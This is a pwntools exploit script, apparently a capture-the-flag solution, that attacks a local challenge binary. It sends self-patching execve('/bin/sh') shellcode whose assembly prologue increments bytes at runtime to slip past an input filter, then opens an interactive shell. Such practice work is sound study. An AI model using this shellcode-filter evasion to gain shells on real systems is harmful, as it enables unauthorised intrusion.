from pwn import *

io = process("./chall")
# io = gdb.debug("./chall", '''
# b *0x00000000004012f5
# c
# ''')
context.log_level = 'debug' 
context.arch = "amd64"
# payload = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = asm('''
mov dl, 123
inc rdx
add DWORD PTR [rdx], 1
mov dl, 123
add rdx, 1
inc rdx
add DWORD PTR [rdx], 1
mov dl, 127
inc rdx
add DWORD PTR [rdx], 1
mov dl, 131
add rdx, 1
inc rdx
add DWORD PTR [rdx], 1
mov dl, 133
inc rdx
add DWORD PTR [rdx], 1
mov dl, 137
inc rdx
add DWORD PTR [rdx], 1
mov dl, 141
inc rdx
add DWORD PTR [rdx], 1
mov dl, 141
add rdx, 1
inc rdx
add DWORD PTR [rdx], 1
mov dl, 143
inc rdx
add DWORD PTR [rdx], 1
mov dl, 143
add rdx, 1
inc rdx
add DWORD PTR [rdx], 1
mov dl, 145
add rdx, 1
inc rdx
add DWORD PTR [rdx], 1
mov dl, 147
inc rdx
add DWORD PTR [rdx], 1
mov dl, 149
inc rdx
add DWORD PTR [rdx], 1
''')
payload += b'\x30\xbf\x48\xbb\xd0\x9d\x96\x91\xd0\x8b\x96\xff\x48\xf7\xda\x53\x54\x5f\x98\x51\x56\x53\x5e\xaf\x3a\x0f\x04'
io.recvuntil(">")
io.send(payload)
io.interactive()

# add even
# mov dl, 0x7
# inc rdx
# add DWORD PTR [rdx], 1
# 8
# add odd
# mov dl, 0x7
# add rdx, 1
# inc rdx
# add DWORD PTR [rdx], 1
# 12
